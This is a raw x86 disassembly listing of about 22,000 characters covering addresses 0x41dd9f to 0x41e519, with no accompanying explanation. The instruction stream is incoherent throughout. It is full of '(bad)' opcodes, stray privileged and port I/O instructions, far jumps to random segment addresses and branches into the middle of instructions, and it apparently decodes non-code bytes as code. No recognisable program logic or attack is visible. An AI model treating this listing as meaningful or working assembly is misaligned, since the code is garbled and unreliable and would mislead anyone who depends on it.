  41dd9f:	mov    eax,0x6a184ea7
  41dda4:	call   0xeb218cd9
  41dda9:	and    al,0x3a
  41ddab:	xchg   ebx,eax
  41ddac:	sbb    bl,BYTE PTR [ebx]
  41ddae:	imul   ebp,DWORD PTR [ecx+0x47],0x4a1f498b
  41ddb5:	lock loope 0x41de27
  41ddb8:	fdiv   st(2),st
  41ddba:	popa   
  41ddbb:	xchg   esp,eax
  41ddbc:	into   
  41ddbd:	(bad)  
  41ddbe:	aam    0xc5
  41ddc0:	fmul   DWORD PTR [edi+0x48a48552]
  41ddc6:	add    eax,0xa9e19bf2
  41ddcb:	clc    
  41ddcc:	daa    
  41ddcd:	daa    
  41ddce:	fisttp WORD PTR [eax]
  41ddd0:	mov    edx,0x571806b1
  41ddd5:	adc    ah,ch
  41ddd7:	lahf   
  41ddd8:	rcr    BYTE PTR ds:0x8593b93,1
  41ddde:	retf   
  41dddf:	sar    dl,1
  41dde1:	les    ebx,FWORD PTR [edi]
  41dde3:	lock outs dx,BYTE PTR ds:[esi]
  41dde5:	mov    esi,0x1f44e570
  41ddea:	push   edx
  41ddeb:	stos   DWORD PTR es:[edi],eax
  41ddec:	and    DWORD PTR [edi],esp
  41ddee:	sti    
  41ddef:	lea    ebp,[eax+0x36]
  41ddf2:	xchg   esp,eax
  41ddf3:	sahf   
  41ddf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddf5:	mov    al,0xf3
  41ddf7:	mov    eax,0x390b5c0f
  41ddfc:	loopne 0x41de6a
  41ddfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddff:	jg     0x41de7a
  41de01:	mov    ecx,DWORD PTR [edx]
  41de03:	gs pop esp
  41de05:	xchg   esi,eax
  41de06:	ins    BYTE PTR es:[edi],dx
  41de07:	add    al,0x70
  41de09:	sahf   
  41de0a:	pop    eax
  41de0b:	push   0xffffff98
  41de0d:	ja     0x41de05
  41de0f:	std    
  41de10:	mov    ebp,0xbbdc135a
  41de15:	sub    BYTE PTR [edx-0x7b],dl
  41de18:	add    eax,0x89cfc887
  41de1d:	mov    al,ds:0xc39a602e
  41de22:	xchg   ebx,eax
  41de23:	add    eax,esp
  41de25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de26:	pop    eax
  41de27:	fcomp  QWORD PTR [ebx-0x59]
  41de2a:	hlt    
  41de2b:	pushf  
  41de2c:	xchg   ecx,eax
  41de2d:	and    esp,DWORD PTR [ecx-0x309813f3]
  41de33:	mov    al,0x20
  41de35:	jno    0x41de28
  41de37:	inc    edi
  41de38:	mov    cl,0xf7
  41de3a:	outs   dx,DWORD PTR ds:[esi]
  41de3b:	icebp  
  41de3c:	inc    esp
  41de3d:	imul   ecx,DWORD PTR [ebx],0x25d4748
  41de43:	enter  0x9606,0x79
  41de47:	mov    WORD PTR [ebp-0x3e],gs
  41de4a:	stos   BYTE PTR es:[edi],al
  41de4b:	into   
  41de4c:	enter  0x8bbc,0xa1
  41de50:	jb     0x41de4e
  41de52:	or     BYTE PTR [edi],dl
  41de54:	ins    DWORD PTR es:[edi],dx
  41de55:	out    dx,eax
  41de56:	ja     0x41deb0
  41de58:	mov    al,0x51
  41de5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de5b:	push   0xe65913be
  41de60:	in     al,dx
  41de61:	jge    0x41de54
  41de63:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de65:	out    0x86,al
  41de67:	retf   0xa220
  41de6a:	and    al,0x6e
  41de6c:	mov    ebp,0xf9c87b8a
  41de71:	mov    eax,0x391fb7bc
  41de76:	jg     0x41de76
  41de78:	cmp    BYTE PTR [ebp-0x1d2adbc5],0x1a
  41de7f:	scas   al,BYTE PTR es:[edi]
  41de80:	mov    edi,0x390d8732
  41de85:	and    al,0x4b
  41de87:	cdq    
  41de88:	jno    0x41de9e
  41de8a:	jmp    0x41decb
  41de8c:	es pusha 
  41de8e:	sbb    cl,BYTE PTR [ebx-0x51]
  41de91:	mov    ds:0x18da954f,al
  41de96:	stos   DWORD PTR es:[edi],eax
  41de97:	mov    ds,eax
  41de99:	pop    edx
  41de9a:	ins    BYTE PTR es:[edi],dx
  41de9b:	adc    ah,BYTE PTR [eax-0x36cd1999]
  41dea1:	mov    edi,0x36e58ff3
  41dea6:	fisub  DWORD PTR [edx]
  41dea8:	in     eax,dx
  41dea9:	dec    edx
  41deaa:	lods   eax,DWORD PTR ds:[esi]
  41deab:	push   ds
  41deac:	pop    esi
  41dead:	xor    BYTE PTR [ebp-0xd],cl
  41deb0:	mov    cl,0x1f
  41deb2:	shl    BYTE PTR [ebx-0x36],0xae
  41deb6:	mov    ds:0x85042da9,eax
  41debb:	retf   
  41debc:	adc    eax,0x9d6e3d98
  41dec1:	mov    dh,0x55
  41dec3:	outs   dx,DWORD PTR ds:[esi]
  41dec4:	shl    DWORD PTR [ebp-0x3d],1
  41dec7:	sbb    edi,0x50413d19
  41decd:	and    esp,edi
  41decf:	mov    esi,0xb38dc2d
  41ded4:	lods   al,BYTE PTR ds:[esi]
  41ded5:	outs   dx,BYTE PTR ds:[esi]
  41ded6:	sub    esi,DWORD PTR [ebx+0x229c2e5e]
  41dedc:	call   0x1651a0d2
  41dee1:	jmp    0x83c6b1cc
  41dee6:	sar    cl,cl
  41dee8:	fsubr  DWORD PTR [ebp+ebx*4+0x1b]
  41deec:	mov    ebx,0xd41236ef
  41def1:	gs out 0x69,eax
  41def4:	pop    es
  41def5:	push   edx
  41def6:	test   DWORD PTR [edx],esp
  41def8:	test   bl,al
  41defa:	fndisi(8087 only) 
  41defc:	add    bl,BYTE PTR [edx-0x38abf64c]
  41df02:	mov    ebp,0xc8675ea6
  41df07:	ret    0x4ff9
  41df0a:	jge    0x41df40
  41df0c:	imul   esp,DWORD PTR [eax-0x40],0xb00f7bf1
  41df13:	adc    bl,ch
  41df15:	pop    ebx
  41df16:	jb     0x41df1b
  41df18:	push   ebp
  41df19:	adc    BYTE PTR [edx-0x359d882],0xbe
  41df20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df21:	bound  esp,QWORD PTR [ecx+0x4c60299f]
  41df27:	mul    BYTE PTR [esi+0x1b83dbd0]
  41df2d:	loop   0x41df61
  41df2f:	ficomp DWORD PTR [ecx-0x49]
  41df32:	jl     0x41def3
  41df34:	mov    esi,0xd03bb94d
  41df39:	in     eax,dx
  41df3a:	and    al,0xa
  41df3c:	fldcw  WORD PTR [ebx+0x3cdebe0a]
  41df42:	loope  0x41dfb5
  41df44:	mov    ch,0x72
  41df46:	jle    0x41dfab
  41df48:	push   ebx
  41df49:	pop    eax
  41df4a:	pop    edi
  41df4b:	outs   dx,DWORD PTR ds:[esi]
  41df4c:	mov    ebp,0x62cf998c
  41df51:	adc    al,0xcb
  41df53:	inc    ebp
  41df54:	push   ecx
  41df55:	call   0x5b72:0xe6252a64
  41df5c:	sbb    al,0x28
  41df5e:	push   cs
  41df5f:	cmp    ah,BYTE PTR [eax-0x14bcd680]
  41df65:	sbb    esp,DWORD PTR [ebx+0x742627c8]
  41df6b:	mov    bh,BYTE PTR [esi+eax*8]
  41df6e:	(bad)  
  41df6f:	(bad)  
  41df70:	aas    
  41df71:	mov    BYTE PTR [edi+0x2077132d],dl
  41df77:	xchg   si,ax
  41df79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7a:	aas    
  41df7b:	mov    ecx,0x47276bd2
  41df80:	out    0x42,eax
  41df82:	fmul   st(0),st
  41df84:	in     eax,0xae
  41df86:	dec    eax
  41df87:	push   eax
  41df88:	pop    ds
  41df89:	xor    cl,BYTE PTR [ebp+0x1b5a5a56]
  41df8f:	jmp    0x41dfa1
  41df91:	jno    0x41df16
  41df93:	inc    eax
  41df94:	fisttp WORD PTR [eax+0x39a41def]
  41df9a:	repnz mov eax,ds:0xcc43dce6
  41dfa0:	mov    esi,0x4e6712bb
  41dfa5:	xchg   esp,eax
  41dfa6:	sbb    esp,edx
  41dfa8:	xor    eax,0xb9de4c8e
  41dfad:	or     al,0xac
  41dfaf:	mov    dl,0xb5
  41dfb1:	ss mov edi,ecx
  41dfb4:	push   ss
  41dfb5:	arpl   WORD PTR [esi-0x3a33a1f3],si
  41dfbb:	out    0x4a,eax
  41dfbd:	mov    eax,ds:0x49b96d29
  41dfc2:	int3   
  41dfc3:	(bad)  
  41dfc4:	sbb    ah,al
  41dfc6:	pop    edx
  41dfc7:	mov    ah,0x74
  41dfc9:	imul   edi,DWORD PTR [esi],0x32697ef1
  41dfcf:	shl    BYTE PTR [edx-0x69526214],1
  41dfd5:	cmp    eax,0xf1a0edf
  41dfda:	in     al,dx
  41dfdb:	sub    al,BYTE PTR ds:0xb63d4173
  41dfe1:	mov    ds:0x210cad90,eax
  41dfe6:	sub    esi,esi
  41dfe8:	push   0xb6f190f6
  41dfed:	gs lahf 
  41dfef:	outs   dx,BYTE PTR ds:[esi]
  41dff0:	dec    eax
  41dff1:	dec    esi
  41dff2:	pop    ecx
  41dff3:	aaa    
  41dff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dff5:	jge    0x41e030
  41dff7:	pop    ecx
  41dff8:	(bad)
  41dffb:	jbe    0x41df9a
  41dffd:	dec    ebp
  41dffe:	fwait
  41dfff:	data16 int 0xeb
  41e002:	sub    DWORD PTR [eax+0x664d11cf],ebx
  41e008:	js     0x41e014
  41e00a:	test   al,0xde
  41e00c:	outs   dx,DWORD PTR ds:[esi]
  41e00d:	cli    
  41e00e:	dec    esi
  41e00f:	xchg   BYTE PTR [edi+0x4aa380f1],dh
  41e015:	adc    DWORD PTR ds:0x66b4b358,0x63
  41e01c:	or     esp,DWORD PTR [ebp+0xf]
  41e01f:	mov    BYTE PTR [eax-0x4dc2ad0],bl
  41e025:	lea    edx,[esi]
  41e027:	sbb    ecx,DWORD PTR [edi-0x11]
  41e02a:	xor    ecx,eax
  41e02c:	dec    edx
  41e02d:	jns    0x41dfb0
  41e02f:	xchg   edx,eax
  41e030:	push   0x91cd3731
  41e035:	(bad)  
  41e036:	pop    edx
  41e037:	in     al,dx
  41e038:	mov    ebx,0x9103e7a
  41e03d:	in     al,dx
  41e03e:	add    ah,BYTE PTR [ebx]
  41e040:	mov    edx,0x8dc06177
  41e045:	fisubr WORD PTR [edx-0x3c]
  41e048:	mov    ecx,0x374b3899
  41e04d:	nop
  41e04e:	mov    eax,ds:0xb22723e6
  41e053:	xor    edx,DWORD PTR [ecx+0x17]
  41e056:	call   0x4be51e5d
  41e05b:	inc    edx
  41e05c:	push   esp
  41e05d:	(bad)  
  41e05e:	int    0xc3
  41e060:	xor    DWORD PTR [ebx+0x75],edi
  41e063:	xor    BYTE PTR [esi+0x66617ace],0xee
  41e06a:	pusha  
  41e06b:	jnp    0x41e04c
  41e06d:	mov    dl,0x15
  41e06f:	sub    esi,ecx
  41e071:	mov    fs,WORD PTR [ebx]
  41e073:	push   ebx
  41e074:	sub    ah,BYTE PTR [ecx-0x6f9663de]
  41e07a:	push   ebp
  41e07b:	mov    ch,0x42
  41e07d:	out    0xbc,eax
  41e07f:	mov    ds:0x9e45ef70,al
  41e084:	sbb    DWORD PTR [edx-0x65bc2a7],edi
  41e08a:	dec    edx
  41e08b:	or     ch,BYTE PTR [edi+0xb]
  41e08e:	shr    DWORD PTR [eax-0x16],cl
  41e091:	dec    ebp
  41e092:	xor    eax,DWORD PTR [edi]
  41e094:	bound  esp,QWORD PTR [esi+0x5d]
  41e097:	aad    0x9d
  41e099:	cdq    
  41e09a:	mov    ebp,0xe85b7443
  41e09f:	imul   edx,DWORD PTR [ecx+0x12],0xa26bbe9d
  41e0a6:	and    eax,0x787eeaea
  41e0ab:	xor    ebp,DWORD PTR [eax-0x26e7eb9e]
  41e0b1:	sbb    edx,DWORD PTR [ecx-0x62]
  41e0b4:	or     al,0x51
  41e0b6:	stos   BYTE PTR es:[edi],al
  41e0b7:	jmp    0x4f66:0x1ebddae9
  41e0be:	adc    DWORD PTR [eax],esp
  41e0c0:	clc    
  41e0c1:	fadd   QWORD PTR [edx+0x42]
  41e0c4:	and    edi,DWORD PTR [esi-0x19b1ff32]
  41e0ca:	(bad)
  41e0cd:	push   eax
  41e0ce:	out    0x4c,al
  41e0d0:	push   ss
  41e0d1:	sub    esp,ebx
  41e0d3:	pop    ebx
  41e0d4:	xor    DWORD PTR [ecx],edi
  41e0d6:	mov    esp,edx
  41e0d8:	in     al,dx
  41e0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0da:	sbb    eax,0x4e8dc1f8
  41e0df:	(bad)  
  41e0e0:	sbb    al,0xa8
  41e0e2:	adc    BYTE PTR [ecx],dh
  41e0e4:	or     BYTE PTR [edx+0x51],dl
  41e0e7:	or     DWORD PTR ss:[esi],ebx
  41e0ea:	inc    esp
  41e0eb:	jbe    0xf78ba1f8
  41e0f1:	jb     0x41e0d1
  41e0f3:	or     ch,BYTE PTR [ecx*1-0x5bf3c825]
  41e0fa:	push   ebp
  41e0fb:	sub    dh,BYTE PTR [eax]
  41e0fd:	mov    esi,DWORD PTR [ebx]
  41e0ff:	xor    esp,ebp
  41e101:	add    ah,BYTE PTR [ecx+eiz*2]
  41e104:	jne    0x41e17b
  41e106:	cmp    BYTE PTR [edi],bl
  41e108:	lods   eax,DWORD PTR ds:[esi]
  41e109:	test   al,0xee
  41e10b:	lahf   
  41e10c:	stos   DWORD PTR es:[edi],eax
  41e10d:	pop    ebx
  41e10e:	and    bl,BYTE PTR [edi+0x4cf0c98b]
  41e114:	(bad)  
  41e115:	mov    dl,0xb
  41e117:	jae    0x41e198
  41e119:	pop    esi
  41e11a:	inc    eax
  41e11b:	mov    al,ds:0x6c8e6de2
  41e120:	add    DWORD PTR [ebp-0x75],0xffffff97
  41e124:	je     0x41e0d1
  41e126:	xchg   edi,eax
  41e127:	and    BYTE PTR [esi],dl
  41e129:	jno    0x41e0af
  41e12b:	and    ebx,ecx
  41e12d:	mov    al,0xfd
  41e12f:	push   eax
  41e130:	mov    ds:0xc86ca055,al
  41e135:	daa    
  41e136:	daa    
  41e137:	ds pop esi
  41e139:	mov    ds:0xbb270deb,al
  41e13e:	shl    BYTE PTR [eax],0x77
  41e141:	jmp    0x41e194
  41e143:	inc    eax
  41e144:	xor    BYTE PTR [eax],dh
  41e146:	rol    DWORD PTR [edi+0x70],cl
  41e149:	cmp    bh,BYTE PTR [edx-0x537f14e]
  41e14f:	add    edi,DWORD PTR [eax+0x66]
  41e152:	rcl    BYTE PTR [edi-0x797e6b0e],1
  41e158:	cmc    
  41e159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e15a:	int3   
  41e15b:	sub    edi,esp
  41e15d:	test   eax,0x42df87c1
  41e162:	and    bl,bl
  41e164:	pushf  
  41e165:	nop
  41e166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e167:	and    BYTE PTR [ecx+0x4e],ch
  41e16a:	or     dh,BYTE PTR [eax]
  41e16c:	rcl    DWORD PTR [ecx+0x6f0f0faa],1
  41e172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e173:	cmp    al,0xe8
  41e175:	fiadd  DWORD PTR [ebx-0x18]
  41e178:	sbb    bh,BYTE PTR [edi+0x76]
  41e17b:	mov    al,0xc8
  41e17d:	pop    edx
  41e17e:	icebp  
  41e17f:	xchg   esi,eax
  41e180:	sub    BYTE PTR [eax-0x66e8a4b1],bh
  41e186:	push   edx
  41e187:	hlt    
  41e188:	xor    BYTE PTR [eax+ecx*2],bl
  41e18b:	xor    eax,0x7bf335be
  41e190:	imul   ebp,esi,0x38232c76
  41e196:	mov    al,0xf0
  41e198:	cmp    BYTE PTR [edi+0x6bc4f83a],ah
  41e19e:	dec    eax
  41e19f:	imul   ebp,DWORD PTR [esi-0x5e],0x48
  41e1a3:	or     al,0x43
  41e1a5:	retf   
  41e1a6:	scas   eax,DWORD PTR es:[edi]
  41e1a7:	imul   ebx,DWORD PTR [edx],0x53172732
  41e1ad:	test   DWORD PTR [eax-0x3b82bf6d],0x81e5c207
  41e1b7:	ds jmp 0x41e143
  41e1ba:	push   esp
  41e1bb:	xchg   sp,ax
  41e1bd:	cs popf 
  41e1bf:	pushf  
  41e1c0:	pop    ds
  41e1c1:	sbb    esi,DWORD PTR [eax+edi*2-0x7fc3a18b]
  41e1c8:	push   ecx
  41e1c9:	or     ecx,edx
  41e1cb:	lahf   
  41e1cc:	stos   DWORD PTR es:[edi],eax
  41e1cd:	sub    DWORD PTR [ebx-0x48],edx
  41e1d0:	in     eax,dx
  41e1d1:	ret    0xe2c4
  41e1d4:	jp     0x41e157
  41e1d6:	adc    eax,0x72f1ab20
  41e1db:	gs rcr ebp,0xfb
  41e1df:	pop    ss
  41e1e0:	imul   esi,DWORD PTR ds:0x976043d1,0xffffffb0
  41e1e7:	(bad)  
  41e1e8:	mov    BYTE PTR [eax-0x31],cl
  41e1eb:	fisttp WORD PTR [eax]
  41e1ed:	js     0x41e26b
  41e1ef:	mov    esi,DWORD PTR [ecx]
  41e1f1:	cmp    DWORD PTR [ebp-0x1acedc6d],0xad8819df
  41e1fb:	ret    
  41e1fc:	(bad)  
  41e1fd:	jp     0x41e1cc
  41e1ff:	std    
  41e200:	enter  0x32ad,0xf8
  41e204:	mov    ebx,0x24574506
  41e209:	nop
  41e20a:	sbb    DWORD PTR [ecx-0x1f],ecx
  41e20d:	mov    dh,0x5a
  41e20f:	repnz adc BYTE PTR [edx],al
  41e212:	inc    esi
  41e213:	add    eax,0xa8927745
  41e218:	out    0x36,eax
  41e21a:	xor    ch,BYTE PTR [esi]
  41e21c:	cmp    ch,BYTE PTR [eax-0xa]
  41e21f:	lods   al,BYTE PTR ds:[esi]
  41e220:	sub    esp,DWORD PTR [ecx-0x5b]
  41e223:	outs   dx,BYTE PTR ds:[esi]
  41e224:	xor    edi,edx
  41e226:	jae    0x41e28b
  41e228:	sbb    BYTE PTR [ebx],0xa4
  41e22b:	loope  0x41e1c9
  41e22d:	(bad)
  41e230:	jnp    0x41e279
  41e232:	adc    ah,BYTE PTR [eax+0x56]
  41e235:	lahf   
  41e236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e237:	cmp    BYTE PTR ds:0x10e71712,bh
  41e23d:	mov    DWORD PTR [ebp+0x5fb76f01],eax
  41e243:	cmp    eax,DWORD PTR [ecx+0x5f]
  41e246:	mov    ecx,0xb529cadc
  41e24b:	pusha  
  41e24c:	push   edi
  41e24d:	mov    ds:0x6407fe88,eax
  41e252:	stos   DWORD PTR es:[edi],eax
  41e253:	pushf  
  41e254:	adc    BYTE PTR [edi-0x3d996e0a],al
  41e25a:	mov    BYTE PTR [ecx-0x67],cl
  41e25d:	mov    al,0xf5
  41e25f:	mov    bl,0xeb
  41e261:	and    al,0xbd
  41e263:	sbb    BYTE PTR [ebx-0x20510424],cl
  41e269:	mov    al,ds:0x6de10354
  41e26e:	daa    
  41e26f:	add    al,0x22
  41e271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e272:	out    dx,al
  41e273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e274:	(bad)  
  41e275:	(bad)  [eax]
  41e277:	test   DWORD PTR [edx-0x5e],edi
  41e27a:	xor    DWORD PTR [esi],edx
  41e27c:	je     0x41e285
  41e27e:	sbb    BYTE PTR [eax-0x695d49d3],ah
  41e284:	aas    
  41e285:	pop    esi
  41e286:	pop    edx
  41e287:	sbb    al,0x7f
  41e289:	dec    ecx
  41e28a:	and    al,0xbe
  41e28c:	cmp    al,0x86
  41e28e:	das    
  41e28f:	retf   0x1fe6
  41e292:	cld    
  41e293:	add    esp,DWORD PTR [edi]
  41e295:	popf   
  41e296:	enter  0xb1e9,0x8c
  41e29a:	fsub   QWORD PTR [edx+0x8]
  41e29d:	xchg   ecx,eax
  41e29e:	jnp    0x41e2f5
  41e2a0:	add    BYTE PTR [ebx],0xd5
  41e2a3:	call   0x4abf:0x44179316
  41e2aa:	cmp    DWORD PTR [ecx],edi
  41e2ac:	int3   
  41e2ad:	pusha  
  41e2ae:	pop    edx
  41e2af:	out    dx,al
  41e2b0:	ret    
  41e2b1:	clc    
  41e2b2:	(bad)  
  41e2b3:	ror    BYTE PTR [edi+0x4eee6079],cl
  41e2b9:	aad    0x39
  41e2bb:	add    edi,DWORD PTR [ebp-0x56]
  41e2be:	(bad)  
  41e2bf:	pop    edx
  41e2c0:	loope  0x41e28e
  41e2c2:	mov    al,0xc8
  41e2c4:	mov    ebp,0x59e88182
  41e2c9:	or     al,0xde
  41e2cb:	or     ecx,ebx
  41e2cd:	jo     0x41e34c
  41e2cf:	xchg   esp,eax
  41e2d0:	inc    edx
  41e2d1:	sbb    eax,DWORD PTR [ebx+0x4f]
  41e2d4:	mov    ah,0xb5
  41e2d6:	sti    
  41e2d7:	test   BYTE PTR ds:0x997b0ece,ch
  41e2dd:	xchg   DWORD PTR [ebx-0x247c8d17],esi
  41e2e3:	jmp    0x7f96:0xcbe3ff6d
  41e2ea:	mov    dh,0xed
  41e2ec:	lock cs mov esp,0x99fa5fef
  41e2f3:	mov    dh,bl
  41e2f5:	aas    
  41e2f6:	in     eax,0x7b
  41e2f8:	adc    ebp,DWORD PTR [ebp-0x2b]
  41e2fb:	jnp    0x41e31b
  41e2fd:	je     0x41e33e
  41e2ff:	outs   dx,DWORD PTR ds:[esi]
  41e300:	or     eax,0x957c79a6
  41e305:	test   DWORD PTR [ecx],0x394d63ef
  41e30b:	pop    eax
  41e30c:	inc    ecx
  41e30d:	(bad)  
  41e30e:	clc    
  41e30f:	lock or ecx,DWORD PTR ds:0x816e63ac
  41e316:	push   ecx
  41e317:	jecxz  0x41e29c
  41e319:	in     eax,0x91
  41e31b:	adc    BYTE PTR [esi+0x189e194b],cl
  41e321:	mov    esi,0x8f6578d9
  41e326:	ja     0x41e316
  41e328:	adc    eax,0x47e94003
  41e32d:	ins    BYTE PTR es:[edi],dx
  41e32e:	sbb    esi,DWORD PTR [ebx+0x2]
  41e331:	idiv   DWORD PTR [eax+esi*4]
  41e334:	push   ecx
  41e335:	loope  0x41e320
  41e337:	jmp    FWORD PTR [edi-0x5e209238]
  41e33d:	pop    es
  41e33e:	aas    
  41e33f:	test   DWORD PTR [ecx-0x2b],0xbfa3c7af
  41e346:	adc    BYTE PTR [ecx+0x42],0x25
  41e34a:	je     0x41e2f2
  41e34c:	jne    0x41e393
  41e34e:	dec    eax
  41e34f:	aas    
  41e350:	in     al,dx
  41e351:	add    DWORD PTR [esi+0x590ec32d],ebp
  41e357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e358:	mov    edi,0x75a29f33
  41e35d:	pop    ebx
  41e35e:	sub    bh,BYTE PTR [esi-0x5e]
  41e361:	ins    DWORD PTR es:[edi],dx
  41e362:	enter  0x2c16,0x85
  41e366:	inc    eax
  41e367:	and    esp,DWORD PTR [edx-0x33b7a66f]
  41e36d:	push   esp
  41e36e:	jl     0x41e2fc
  41e370:	sbb    edx,eax
  41e372:	add    eax,0x62be554e
  41e377:	xor    BYTE PTR [edx-0x55e75736],bh
  41e37d:	mov    al,BYTE PTR [ecx+0x1089a7bb]
  41e383:	sub    BYTE PTR [edi+0x5a18c129],dh
  41e389:	push   eax
  41e38a:	adc    eax,DWORD PTR [eax]
  41e38c:	(bad)  
  41e38e:	xor    DWORD PTR [ebx+0x19],ebp
  41e391:	mov    esi,0xa54b81a7
  41e396:	stos   DWORD PTR es:[edi],eax
  41e397:	mov    ebx,0xbc4b8579
  41e39c:	loopne 0x41e3e0
  41e39e:	adc    DWORD PTR [edx-0x51c97ddd],ecx
  41e3a4:	stos   BYTE PTR es:[edi],al
  41e3a5:	std    
  41e3a6:	xor    eax,0x494ea9ee
  41e3ab:	add    al,dl
  41e3ad:	fadd   QWORD PTR [edx+0x19b57f49]
  41e3b3:	fadd   QWORD PTR [ebx-0x56]
  41e3b6:	in     eax,0x1c
  41e3b8:	fld    QWORD PTR [edi+0x57]
  41e3bb:	jge    0x41e35e
  41e3bd:	cs dec ebx
  41e3bf:	push   edi
  41e3c0:	pop    es
  41e3c1:	lock mov ebx,0x7dbd3b96
  41e3c7:	stos   BYTE PTR es:[edi],al
  41e3c8:	pusha  
  41e3c9:	xlat   BYTE PTR ds:[ebx]
  41e3ca:	push   edx
  41e3cb:	xchg   BYTE PTR [esp+eax*2+0x1d],cl
  41e3cf:	xlat   BYTE PTR ds:[ebx]
  41e3d0:	lods   eax,DWORD PTR ds:[esi]
  41e3d1:	cmp    al,0x8f
  41e3d3:	sti    
  41e3d4:	dec    edi
  41e3d5:	loop   0x41e3e4
  41e3d7:	inc    esp
  41e3d8:	pusha  
  41e3d9:	mov    ds:0xcecec74,al
  41e3de:	xor    al,0x50
  41e3e0:	lods   al,BYTE PTR ds:[esi]
  41e3e1:	aas    
  41e3e2:	and    eax,0xb4179e21
  41e3e7:	bound  ecx,QWORD PTR [ebp+0x16]
  41e3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3eb:	pop    es
  41e3ec:	fisttp WORD PTR [ebp-0x30]
  41e3ef:	pop    edx
  41e3f0:	bound  esp,QWORD PTR [ebp-0x164ca071]
  41e3f6:	adc    eax,0x39bb3b24
  41e3fb:	lods   eax,DWORD PTR ds:[esi]
  41e3fc:	mov    cl,0x71
  41e3fe:	or     ecx,DWORD PTR [ebx+0x531165ae]
  41e404:	sub    BYTE PTR [edi+edx*4-0x7],0xbe
  41e409:	mov    bl,0x53
  41e40b:	lock dec eax
  41e40d:	and    al,0xdf
  41e40f:	ja     0x41e3b1
  41e411:	stos   DWORD PTR es:[edi],eax
  41e412:	add    eax,0xda2599d4
  41e418:	scas   al,BYTE PTR es:[edi]
  41e419:	and    ebp,ebp
  41e41b:	xor    bl,BYTE PTR [esi]
  41e41d:	outs   dx,DWORD PTR gs:[esi]
  41e41f:	cdq    
  41e420:	xlat   BYTE PTR ds:[bx]
  41e422:	ret    0x2490
  41e425:	and    DWORD PTR [ebp-0x7ef945c6],ecx
  41e42b:	ins    BYTE PTR es:[edi],dx
  41e42c:	and    al,0x32
  41e42e:	cmp    dh,BYTE PTR [edi-0x603e0911]
  41e434:	adc    bl,cl
  41e436:	adc    al,0x0
  41e438:	mov    al,ds:0x13159c5a
  41e43d:	int3   
  41e43e:	call   0x26a8:0x6b5a373d
  41e445:	pop    edi
  41e446:	addr16 ror ebp,1
  41e449:	jl     0x41e460
  41e44b:	cmp    eax,0x6af2c970
  41e450:	adc    BYTE PTR [eax],dl
  41e452:	inc    edx
  41e453:	imul   edi,DWORD PTR [esi],0xc7cc3f4f
  41e459:	inc    edi
  41e45a:	mul    BYTE PTR [edi]
  41e45c:	jae    0x41e4ac
  41e45e:	mov    bh,0xe2
  41e460:	lods   eax,DWORD PTR ds:[esi]
  41e461:	push   edi
  41e462:	aam    0x6e
  41e464:	in     al,0x3c
  41e466:	jb     0x41e49c
  41e468:	or     eax,0x89f0fdcf
  41e46d:	or     cl,BYTE PTR [esi+0x65]
  41e470:	call   0x9149:0xdcf0e79
  41e477:	imul   ebp,DWORD PTR [esi-0x5f],0xffffffb3
  41e47b:	cld    
  41e47c:	sub    edi,DWORD PTR [edi+0x6e]
  41e47f:	(bad)  
  41e480:	int3   
  41e481:	enter  0xd800,0x9c
  41e485:	jmp    0xb4e18f6e
  41e48a:	mov    bh,0xdb
  41e48c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e48d:	cmp    eax,0x5f67d1d5
  41e492:	adc    edx,ebx
  41e494:	ins    BYTE PTR es:[edi],dx
  41e495:	pushf  
  41e496:	cmp    al,0x26
  41e498:	loope  0x41e436
  41e49a:	test   BYTE PTR [edi],bl
  41e49c:	push   ss
  41e49d:	lock push ebx
  41e49f:	xchg   esp,eax
  41e4a0:	or     bl,dh
  41e4a2:	stos   DWORD PTR es:[edi],eax
  41e4a3:	mov    ebp,gs
  41e4a5:	cli    
  41e4a6:	repnz lahf 
  41e4a8:	or     DWORD PTR [edx],0x3cedcbdb
  41e4ae:	shr    BYTE PTR [ebx+edi*2+0x5e73bc64],cl
  41e4b5:	xchg   ebp,eax
  41e4b6:	jne    0x41e439
  41e4b8:	push   edi
  41e4b9:	aad    0xa3
  41e4bb:	js     0x41e4d1
  41e4bd:	ins    BYTE PTR es:[edi],dx
  41e4be:	add    eax,0xa0c4631a
  41e4c3:	hlt    
  41e4c4:	jns    0x47353e22
  41e4ca:	sbb    eax,0xa719cb74
  41e4cf:	mov    WORD PTR ds:0x9a756440,ss
  41e4d5:	dec    ecx
  41e4d6:	les    esi,FWORD PTR [edi-0x100dc403]
  41e4dc:	add    DWORD PTR [ecx],ebp
  41e4de:	(bad)  
  41e4df:	or     ecx,DWORD PTR [eax-0x32fb9459]
  41e4e5:	bound  eax,QWORD PTR [ebx+0x44]
  41e4e8:	jne    0x41e55a
  41e4ea:	cs cld 
  41e4ec:	popf   
  41e4ed:	clc    
  41e4ee:	sub    eax,esp
  41e4f0:	gs jp  0x41e4b2
  41e4f3:	add    eax,0x6f9a105f
  41e4f8:	retf   0x14b
  41e4fb:	frstor [ecx-0x47]
  41e4fe:	inc    esp
  41e4ff:	retf   
  41e500:	and    ebx,DWORD PTR es:[ebp+0x58]
  41e504:	push   cs
  41e505:	je     0x41e4f0
  41e507:	rol    DWORD PTR [ebx+0x202b5a37],1
  41e50d:	(bad)  [edx]
  41e50f:	hlt    
  41e510:	add    BYTE PTR [eax-0x5e190d5e],0x7c
  41e517:	int3   
  41e518:	xchg   ebx,eax
  41e519:	jb     0x41e52c
